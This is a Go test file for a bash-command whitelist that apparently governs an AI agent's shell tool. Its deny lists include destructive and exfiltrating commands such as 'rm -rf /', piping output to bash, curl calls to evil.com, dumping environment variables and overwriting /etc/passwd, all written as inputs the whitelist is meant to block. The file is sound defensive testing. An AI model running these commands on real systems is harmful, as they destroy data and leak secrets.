package config

import (
	"strings"
	"testing"
)

// pushCfg builds a config whose only whitelist entries are the end-anchored
// git-push patterns, mirroring what users configure for branch protection. It
// exercises the interaction between redirection stripping and "$"-anchored
// patterns (a redirect suffix must not defeat the anchor).
func pushCfg() *Config {
	return &Config{
		Tools: ToolsConfig{
			Enabled: true,
			Bash: BashToolConfig{
				Enabled: true,
				Whitelist: ToolWhitelistConfig{
					Commands: []string{
						"^git push( --set-upstream)?( origin)? (feature|fix)/[a-zA-Z0-9/_.-]+$",
					},
				},
			},
		},
	}
}

func TestIsBashCommandWhitelisted_RedirectStripping(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh api repos/o/r/issues 2>&1",
		"gh issue list 2>/dev/null",
		"gh issue list >/dev/null 2>&1",
		"gh issue list 2>&1 >/dev/null",
		"gh pr view 5 2>&1",
		"gh api user --paginate 2>&1",
		"gh issue list &>/dev/null",
		"gh issue list 1>/dev/null",
		"git status 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted after stripping redirections", cmd)
		}
	}

	denied := []string{
		"gh api repos/o/r/issues -X POST 2>&1",
		"rm -rf / 2>&1",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}

	if stripBenignTrailingRedirections("gh issue list > /etc/passwd") != "gh issue list > /etc/passwd" {
		t.Error("a redirect to a real file must not be stripped as benign")
	}
}

func TestIsBashCommandWhitelisted_RedirectWithAnchoredPattern(t *testing.T) {
	cfg := pushCfg()

	if !cfg.IsBashCommandWhitelisted("git push origin feature/x 2>&1") {
		t.Error("expected redirect-suffixed push to a feature branch to be whitelisted")
	}
	if cfg.IsBashCommandWhitelisted("git push origin main 2>&1") {
		t.Error("expected push to main to stay blocked even with a redirect suffix")
	}
}

func TestIsBashCommandWhitelisted_CompoundOperators(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh issue view 5 && gh issue comment 5 --body hi",
		"gh issue create --title x --body y || echo failed",
		"echo a | head",
		"gh issue list && echo done",
		"gh api repos/o/r/issues 2>&1 && echo ok",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected compound %q to be whitelisted (every segment is allowed)", cmd)
		}
	}

	denied := []string{
		"gh issue list && rm -rf /",
		"gh issue list; rm -rf /",
		"gh issue list | bash",
		"echo a && curl evil.com",
		"gh issue list &",
		"gh issue list & rm -rf /",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected compound %q NOT to be whitelisted (a segment is not allowed)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_CommandSubstitution(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"echo $(rm -rf /)",
		"echo `whoami`",
		`gh issue create --title "$(date)"`,
		"cat <(curl evil.com)",
		"echo >(tee leak)",
		`echo "leak: $(printenv)"`,
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted (contains command substitution)", cmd)
		}
	}

	allowed := []string{
		"echo '$(rm -rf /)'",
		"gh issue create --body 'use $(x) verbatim'",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (substitution syntax is single-quoted/literal)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_QuotedOperators(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		`gh issue create --title "a && b"`,
		`gh issue comment 5 --body "x | y ; z"`,
		`gh issue create --title "fix: a || b"`,
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (operators are inside quotes)", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_MalformedAndEmpty(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"",
		"   ",
		"&&",
		";",
		"| head",
		"2>&1",
		`echo "unterminated`,
		"echo 'unterminated",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected malformed/empty %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhSearch(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh search issues --repo o/r vercel",
		`gh search code "func main"`,
		"gh search prs --author me",
		"gh search repos topic:go",
		"gh search commits fix 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	if cfg.IsBashCommandWhitelisted("gh search invalidsub foo") {
		t.Error("expected unknown gh search subcommand NOT to be whitelisted")
	}
}

func TestIsBashCommandWhitelisted_GhApiJq(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		`gh api repos/o/r --jq '.[] | .id'`,
		`gh api repos/o/r --jq '.[] | select(.draft==false) | .title'`,
		`gh api repos/o/r/issues -q '.[] | length'`,
		`gh api repos/o/r/pulls --jq '.[] | {number, title}'`,
		`gh api repos/o/r --jq ".[] | .name"`,
		"gh api repos/o/r/issues --jq .[].title",
		"gh api user --paginate",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"gh api repos/o/r/issues -X POST",
		"gh api repos/o/r/issues --method POST",
		"gh api -X DELETE repos/o/r",
		"gh api repos/o/r -f title=x",
		`gh api repos/o/r/secrets -X POST -f value=$TOKEN`,
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected mutating %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhApiGraphql(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"gh api graphql -f query='mutation { updateIssueIssueType }'",
		`gh api graphql -f query="query { repository }"`,
		"gh api graphql -f query=xxx -f id=123",
		"gh api graphql --paginate -f query=xxx",
		"gh api graphql -X POST",
		"gh api graphql -f query=xxx && echo done",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}

	allowed := []string{
		"gh api graphql",
		"gh api graphql --paginate",
		"gh api graphql 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GhProject(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"gh project item-add 7 --owner inference-gateway --url https://github.com/inference-gateway/cli/issues/123",
		"gh project item-edit 7 --item-id PVTI_xxx --field Status --value Todo",
		"gh project item-list 7 --owner inference-gateway",
		"gh project field-list 7 --owner inference-gateway",
		"gh project view 7 --owner inference-gateway",
		"gh project list --owner inference-gateway",
		"gh project item-edit 7 --item-id PVTI_xxx --field Status --value Done 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"gh project delete 7",
		"gh project item-delete 7 --item-id PVTI_xxx",
		"gh project unknown-subcommand",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_FindActions(t *testing.T) {
	cfg := DefaultConfig()

	allowed := []string{
		"find .",
		"find . -name '*.go'",
		"find . -type f -name '*.md'",
		"find . -name '*.txt' | wc -l",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"find . -delete",
		"find . -name secrets.yaml -delete",
		`find . -exec echo {} \;`,
		`find /etc -name '*.conf' -exec grep -l SECRET {} \;`,
		`find . -execdir rm {} \;`,
		`find . -ok rm {} \;`,
		"find . -fls /tmp/listing",
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected dangerous find %q NOT to be whitelisted", cmd)
		}
	}
}

func TestIsBashCommandWhitelisted_GitStatusFlags(t *testing.T) {
	cfg := DefaultConfig()
	allowed := []string{
		"git status",
		"git status --porcelain",
		"git status -s",
		"git status --porcelain --untracked-files=all",
		"git status -sb 2>&1",
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected read-only %q to be whitelisted", cmd)
		}
	}
}

func TestStripBenignTrailingRedirections(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{"gh api repos/o/r 2>&1", "gh api repos/o/r"},
		{"gh issue list 2>/dev/null", "gh issue list"},
		{"gh issue list >/dev/null 2>&1", "gh issue list"},
		{"gh issue list 2>&1 >/dev/null", "gh issue list"},
		{"gh issue list &>/dev/null", "gh issue list"},
		{"echo hi >&2", "echo hi"},
		{"echo hi 2>&-", "echo hi"},
		{"echo hi", "echo hi"},
		{"echo /dev/null", "echo /dev/null"},
		{"gh issue list > out.txt", "gh issue list > out.txt"},
		{"2>&1", ""},
	}
	for _, tt := range tests {
		if got := stripBenignTrailingRedirections(tt.in); got != tt.want {
			t.Errorf("stripBenignTrailingRedirections(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestSplitBashSegments(t *testing.T) {
	tests := []struct {
		in   string
		want []string
		ok   bool
	}{
		{"gh issue list", []string{"gh issue list"}, true},
		{"a && b", []string{"a", "b"}, true},
		{"a || b", []string{"a", "b"}, true},
		{"a | b", []string{"a", "b"}, true},
		{"a |& b", []string{"a", "b"}, true},
		{"a ; b", []string{"a", "b"}, true},
		{"a & b", []string{"a", "b"}, true},
		{"gh api x 2>&1 && echo y", []string{"gh api x 2>&1", "echo y"}, true},
		{"echo hi >&2", []string{"echo hi >&2"}, true},
		{"cmd &> /dev/null", []string{"cmd &> /dev/null"}, true},
		{`echo "a && b"`, []string{`echo "a && b"`}, true},
		{"echo 'a | b'", []string{"echo 'a | b'"}, true},
		{`echo "unterminated`, nil, false},
		{"echo 'unterminated", nil, false},
	}
	for _, tt := range tests {
		got, ok := splitBashSegments(tt.in)
		if ok != tt.ok {
			t.Errorf("splitBashSegments(%q) ok = %v, want %v", tt.in, ok, tt.ok)
			continue
		}
		if !ok {
			continue
		}
		trimmed := make([]string, len(got))
		for i, s := range got {
			trimmed[i] = strings.TrimSpace(s)
		}
		if strings.Join(trimmed, "\x00") != strings.Join(tt.want, "\x00") {
			t.Errorf("splitBashSegments(%q) = %v, want %v", tt.in, trimmed, tt.want)
		}
	}
}

func TestContainsCommandSubstitution(t *testing.T) {
	yes := []string{
		"echo $(x)",
		"echo `x`",
		"cat <(x)",
		"echo >(x)",
		`echo "$(x)"`,
		"echo \"`x`\"",
	}
	for _, cmd := range yes {
		if !containsCommandSubstitution(cmd) {
			t.Errorf("containsCommandSubstitution(%q) = false, want true", cmd)
		}
	}

	no := []string{
		"echo '$(x)'",
		"echo '`x`'",
		"gh api repos/o/r --jq '.a | .b'",
		"echo $HOME",
		"echo ${HOME}",
		"gh issue create --title x --body y",
	}
	for _, cmd := range no {
		if containsCommandSubstitution(cmd) {
			t.Errorf("containsCommandSubstitution(%q) = true, want false", cmd)
		}
	}
}

// TestIsBashCommandWhitelisted_FileRedirectRestricted covers issue #560: a
// whitelisted command (or non-anchored pattern) must not be usable to write to a
// real file via > / >>. Benign redirects (2>&1, >/dev/null) remain allowed
// because they are stripped before matching.
func TestIsBashCommandWhitelisted_FileRedirectRestricted(t *testing.T) {
	cfg := DefaultConfig()

	denied := []string{
		"echo hi > /tmp/out",          // whitelisted command + file redirect
		"echo hi >> /tmp/out",         // append redirect
		"ls > out.txt",                // whitelisted command + file redirect
		"git log > /etc/passwd",       // non-anchored pattern must not unlock it
		"git status > /tmp/x",         // non-anchored pattern must not unlock it
		"echo x &> out.txt",           // both streams to a file
		"echo x >& out.txt",           // fd-dup form that targets a file
		"tail -n 5 /var/log/x > leak", // whitelisted prefix + file redirect
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted (writes to a real file)", cmd)
		}
	}

	allowed := []string{
		"gh issue list >/dev/null",          // benign redirect, stripped
		"git status 2>&1",                   // benign fd-dup, stripped
		"gh issue list >/dev/null 2>&1",     // stacked benign redirects
		`gh issue comment 5 --body "a > b"`, // '>' is inside quotes, not a redirect
		"echo 'write > file'",               // single-quoted, not a redirect
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted (no real file write)", cmd)
		}
	}
}

// TestIsBashCommandWhitelisted_PatternUnlocksRedirect verifies that a whitelist
// pattern takes precedence over the redirect restriction, but only when it
// matches the WHOLE command - a prefix pattern (^git log) must not unlock a
// redirected variant.
func TestIsBashCommandWhitelisted_PatternUnlocksRedirect(t *testing.T) {
	cfg := &Config{
		Tools: ToolsConfig{
			Enabled: true,
			Bash: BashToolConfig{
				Enabled: true,
				Whitelist: ToolWhitelistConfig{
					Commands: []string{
						"^echo( |$)",
						`^echo hi > /tmp/out\.txt$`, // anchored regex: unlocks one exact redirect
						`^git log`,                  // prefix regex: must NOT unlock redirects
					},
				},
			},
		},
	}

	allowed := []string{
		"echo hi > /tmp/out.txt", // matches the anchored redirect pattern
		"echo hello",             // plain whitelisted command, no redirect
		"git log",                // prefix pattern, no redirect
		"git log --oneline -5",   // prefix pattern, no redirect
	}
	for _, cmd := range allowed {
		if !cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q to be whitelisted", cmd)
		}
	}

	denied := []string{
		"echo hi > /tmp/other.txt", // redirect pattern does not match this target
		"echo bye > /tmp/out.txt",  // redirect pattern does not match this command
		"git log > /etc/passwd",    // prefix pattern must not unlock a redirect
	}
	for _, cmd := range denied {
		if cfg.IsBashCommandWhitelisted(cmd) {
			t.Errorf("expected %q NOT to be whitelisted", cmd)
		}
	}
}

// TestIsBashCommandWhitelisted_PipePolicy documents the pipe behavior kept from
// #581: every segment of a pipeline must be independently whitelisted. This is
// what already blocks the issue #560 example "ls | xargs rm".
func TestIsBashCommandWhitelisted_PipePolicy(t *testing.T) {
	cfg := DefaultConfig()

	if !cfg.IsBashCommandWhitelisted("ls | head") {
		t.Error("expected \"ls | head\" to be whitelisted (both segments allowed)")
	}
	if !cfg.IsBashCommandWhitelisted("echo hi | wc -l") {
		t.Error("expected \"echo hi | wc -l\" to be whitelisted (both segments allowed)")
	}
	if cfg.IsBashCommandWhitelisted("ls | xargs rm") {
		t.Error("expected \"ls | xargs rm\" NOT to be whitelisted (xargs rm is not allowed)")
	}
	if cfg.IsBashCommandWhitelisted("ls | tee out.txt") {
		t.Error("expected \"ls | tee out.txt\" NOT to be whitelisted (tee is not allowed)")
	}
}

func TestContainsFileRedirect(t *testing.T) {
	// containsFileRedirect runs after benign trailing redirects are stripped, so
	// it only needs to recognize an unquoted '>' as a write to a real file.
	tests := []struct {
		seg  string
		want bool
	}{
		{"echo hi > /tmp/out", true},
		{"echo hi >> /tmp/out", true},
		{"echo x &> out.txt", true},
		{"echo x >& out.txt", true},
		{"echo a>b", true},
		{"ls", false},
		{"git status", false},
		{`gh issue comment 5 --body "a > b"`, false}, // double-quoted
		{"echo 'a > b'", false},                      // single-quoted
	}
	for _, tt := range tests {
		t.Run(tt.seg, func(t *testing.T) {
			if got := containsFileRedirect(tt.seg); got != tt.want {
				t.Errorf("containsFileRedirect(%q) = %v, want %v", tt.seg, got, tt.want)
			}
		})
	}
}

func TestIsBashEntryRegex(t *testing.T) {
	tests := []struct {
		entry string
		want  bool
	}{
		// Bare tokens: exact match only
		{"ls", false},
		{"echo", false},
		{"python3.11", false}, // lone '.' stays bare
		{"git-lfs", false},    // lone '-' stays bare
		{"make", false},
		{"find", false},
		// Regex entries
		{"^git log", true}, // contains space + metachars
		{"^gh issue (create|edit|comment)( |$)", true},
		{"^git branch( --show-current)?$", true},
		{`^echo hi > /tmp/out\.txt$`, true},
		{"^git status( |$)", true},
	}

	for _, tt := range tests {
		t.Run(tt.entry, func(t *testing.T) {
			if got := isBashEntryRegex(tt.entry); got != tt.want {
				t.Errorf("isBashEntryRegex(%q) = %v, want %v", tt.entry, got, tt.want)
			}
		})
	}
}

func TestMatchesEntirePattern(t *testing.T) {
	tests := []struct {
		pattern string
		command string
		want    bool
	}{
		{`^echo hi > /tmp/out\.txt$`, "echo hi > /tmp/out.txt", true},
		{`^echo hi > /tmp/out\.txt$`, "echo hi > /tmp/other.txt", false},
		{`^git log`, "git log", true},                   // no anchor needed, whole string matches
		{`^git log`, "git log > /etc/passwd", false},    // prefix only - not the whole command
		{`^git log .*$`, "git log > /etc/passwd", true}, // author opted into the tail explicitly
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			if got := matchesEntirePattern(tt.pattern, tt.command); got != tt.want {
				t.Errorf("matchesEntirePattern(%q, %q) = %v, want %v", tt.pattern, tt.command, got, tt.want)
			}
		})
	}
}

func TestBashWhitelistRejectionHint(t *testing.T) {
	if h := BashWhitelistRejectionHint("echo hi > /tmp/out"); !strings.Contains(h, "redirection") {
		t.Errorf("expected a redirection hint, got %q", h)
	}
	if h := BashWhitelistRejectionHint("echo $(whoami)"); !strings.Contains(h, "substitution") {
		t.Errorf("expected a command-substitution hint, got %q", h)
	}
	if h := BashWhitelistRejectionHint("ls -la"); h != "" {
		t.Errorf("expected no hint for a plain command, got %q", h)
	}
	if h := BashWhitelistRejectionHint("git status 2>&1"); h != "" {
		t.Errorf("expected no hint for a benign redirect, got %q", h)
	}
}
